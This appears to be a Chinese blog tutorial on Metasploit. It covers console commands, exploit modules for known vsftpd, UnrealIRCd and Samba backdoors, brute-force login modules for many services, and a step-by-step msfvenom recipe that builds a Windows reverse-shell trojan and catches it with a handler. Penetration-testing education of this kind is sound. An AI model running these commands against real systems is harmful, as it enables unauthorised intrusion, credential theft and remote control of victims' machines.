Metasploit使用
发表于：2021-12-13 | 分类： 安全工具

Metasploit主要作用：

漏洞验证(poc)
漏洞利用(exploit)
内网渗透等

metasploit相关术语:

exploit：攻击
	通过利用msf中的脚本对目标系统实施精准打击或漏洞验证
payload:攻击载荷
	攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码
listener:监听器
	生成木马之后发给受害主机，监听反弹木马连入本机

metasploit所在目录：

/usr/share/metasploit-framework/

metasploit所在目录目录内容：

data目录			#msf攻击过程中使用的一些文件，如字典文件等
	/data/exploits/		#DLL和可执行文件
scripts目录			#主要包含一些攻击需要用到的脚本
	/scripts/meterpreter/	#ruby脚本
	/scripts/ps/		#powershell脚本
	/scripts/resource/	#rc文件
	/scripts/shell		#ruby脚本
tools目录			#存放着大量的实用工具
	/tools/exploit/		#ruby脚本
	/tools/memdump/		#可执行文件
	/tools/password/	#ruby脚本
plugins目录			#集成了第三方的插件，如sqlmap,nessus等
modules目录			#msf重要模块
	/modules/auxiliary/	#漏洞辅助模块，多用于扫描
	/modules/encoders/	#编码器模块，对payloads进行编码
	/modules/evasion/	#创建反杀毒软件的木马
	/modules/exploits/	#攻击模块，实施精准打击
	/modules/payloads/	#漏洞载荷模块，通常作用是为渗透测试者打开在目标系统上的控制会话连接
	modules/nops/		#空指令模块，最典型的空指令就是空操作
	
	注：在msf中，所有的模块都是通过ruby语言进行编写的

启动metasploit:

启动之前要开启postgresql数据库服务：
	service postgresql start
	或
	/etc/init.d/postgresql start

metasploit图形化界面：

armitage
	安装后需要：msfdb init

metasploit常用命令：

show命令：

show exploits		#显示所有的攻击模块
show auxiliary		#显示所有的辅助模块
show targets		#显示攻击的目标
使用模块:use module_name
	use exp(攻击模块)
		show payloads		#显示当前模块可用的攻击载荷
		show options		#显示当前模块所需设置的攻击参数

search命令：

search <关键词>				#检索所需要的模块
search <关键词> type:exploit		#检索所需要的攻击模块
search <关键词> type:auxiliary		#检索所需要的辅助模块

use命令：

use module_name			#使用模块(攻击模块或辅助模块)

info命令：

info module_name		#显示该模块详细信息

set、unset命令：

set target <目标名>		#设置攻击的目标
set payload payload_name		#使用攻击载荷
set <参数名> <值>		#设置该模块所需参数
unset <参数名>			#取消该参数的值

unset -g 命令：

unset -g <参数1> <参数2> <...>		#批量取消参数的值

save命令：

使用save命令对设置的参数进行保存，在下次启动后可以直接使用

run、exploit命令：

run
或
exploit				#实施攻击

banner命令：

banner			#切换msf启动界面图形

Samba MS-RPC shell命令注入漏洞:

  • 漏洞产生原因：传递通过MS-RPC提供的未过滤的用户输入在调用定义的外部脚本时调用/bin/sh,在smb.conf中，导致允许远程命令执行
  • 攻击模块：
    exploit/multi/samba/usermap_script

Vsftpd源码包后门漏洞：

  • 漏洞产生原因：在特定版本的vsftpd服务器程序中，被人恶意植入代码，当用户名以“:)”为结尾，服务器就会在6200端口监听，并且能够执行任意恶意代码
  • 攻击模块:
    exploit/unix/ftp/vsftpd_234_backdoor

UnrealiRCd后门漏洞：

  • 漏洞产生原因：在2009年11月到2010年6月间分布于某些镜面站点的UnrealiRCd,在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者就能够执行任意代码
  • 攻击模块：
    exploit/unix/irc/unreal_ircd_3281_backdoor

Metasploit对各类密码进行破解：

  • FTP服务：文件传输协议，是用于在网络上进行文件传输的一套标准协议。破解成功之后可查看是否有文件上传权限，若有，可进一步利用，若没有，则可以获取一些敏感数据
    • 默认端口：21
    • 攻击模块： 
      auxiliary/scanner/ftp/ftp_login
  • TELNET服务：telnet协议是TCP/IP协议族的一员，是internet远程登录服务的标准协议和主要方式，传输方式为明文传输
    • 默认端口:23
    • 攻击模块： 
      auxiliary/scanner/telnet/telnet_login
  • VNC服务：VNC(Virtual Network Console)是虚拟网络控制台的缩写，是一款远程控制工具
    • 默认端口：5900
    • 攻击模块： 
      auxiliary/scanner/vnc/vnc_login
  • Samba服务：Samba是在linux和unix系统上实现smb协议的一个免费软件，是一种在局域网上共享文件和打印机的一种通信协议
    • 默认端口：445
    • 攻击模块： 
      auxiliary/scanner/smb/smb_login
  • SSH服务：SSH为建立在应用层基础上的安全协议，数据加密传输
    • 默认端口:22
    • 攻击模块： 
      auxiliary/scanner/ssh/ssh_login
auxiliary/scanner/ssh/ssh_login_pubkey
  • MYSQL服务：MYSQL是一个关系型数据库管理系统，以root登录之后可执行系统命令
    • 默认端口：3306
    • 攻击模块： 
      auxiliary/scanner/mysql/mysql_login
注：使用MySQL口令破解模块，这里一定要自定义一个字典。尽管它选项required是no,但是还是需要进行配置
  • MSSQL服务：MSSQL(sql server)是一个关系型数据库管理系统，以sa登录之后可以使用xp_cmdshell执行系统命令
    • 默认端口：1433
    • 攻击模块： 
      auxiliary/scanner/mssql/mssql_login
  • Oracle服务：oracle是一个关系型数据库管理系统
    • 默认端口：1521
    • 攻击模块： 
      auxiliary/scanner/oracle/oracle_login
  • Postgresql服务：postgresql是一个关系型数据库管理系统
    • 默认端口：5432
    • 攻击模块： 
      auxiliary/scanner/postgres/postgres_login
  • HTTP登录认证(路由器)：
    • 支持的路由器：dlink
    • 默认端口：80
    • 攻击模块： 
      auxiliary/scanner/http/dlink_dir_300_615_http_login
auxiliary/scanner/http/dlink_dir_session_cgi_http_login
auxiliary/scanner/http/dlink_dir_615h_http_login
  • PcAnyWhere:pcanywhere是一款远程控制软件，你可以将自己的电脑当成主控端去控制远方另一台同样安装有Pcanywhere的电脑(被控端)
    • 默认端口：5631
    • 攻击模块： 
      auxiliary/scanner/pcanywhere/pcanywhere_login
  • FTP匿名登录：
    • 使用用户名为anonymous登录ftp服务器
    • 默认端口：21
    • 攻击模块： 
      auxiliary/scanner/ftp/anonymous
  • Tomcat登录破解：
    • 默认端口：8080
    • 攻击模块： 
      auxiliary/scanner/http/tomcat_mgr_login

Metasploit生成木马：

生成工具：msfvenom
原理：msfvenom是msfpayload、msfencode的结合体，利用msfvenom生成木马程序，让木马程序在目标机器上运行，在本地监听上线
msfvenom命令：

-p	--payload			#使用指定的payload
-l	--list [module_type]		#列出模块类型所有的模块,模块类型包括：payloads, encoders, nops, platforms, archs, encrypt, formats, all
-n	--nopsled			#在payload上添加一个[长度]大小的nopsled
-f	--format			#指定payload输出格式，如exe等
-e	--encoder			#使用编码器
-a	--arch				#指定payload架构(x86、x64)
--platform				#指定payload平台
-s	--space				#指定最终payload的最大长度
-b	--bad-chars			#避免使用的字符，如：“\x00\xff”
-i	--iterations			#指定payload的编码次数
-c	--add-code			#指定要包含的额外的win32 shellcode文件（路径）
-x	--template			#指定一个自定义可执行文件作为模板使用
-k	--keep				#保留--template行为并将有效负载注入为一个新线程
-o	--out				#保存payload到一个文件中
-v	--var-name			#指定用于某些输出格式的自定义变量名
-h	--help				#显示帮助信息

例：msf生成一个木马并进行远控：

（1）msfvenom -p windows/meterpreter/reverse_tcp lhost=<your ip> lport=<your port> -f exe -o hdy.exe		#生成一个hdy.exe木马
	注：	lhost:攻击机IP
		lport:攻击机端口
（2）use exploit/multi/handler					#使用通用payload处理程序
	 set payload windows/meterpreter/reverse_tcp		#指定生成的木马程序使用的payload
	 set lhost <your ip>					#攻击机的IP
	 set lport <your port>					#攻击机的端口
	 run							#运行
 (3)在靶机上运行生成的木马
 (4)成功的获取靶机shell:
 	
 	sysinfo		#获取系统信息
	shell		#输入shell进入交互式CMD
			注：如果乱码，使用“chcp 65001”命令进行修正
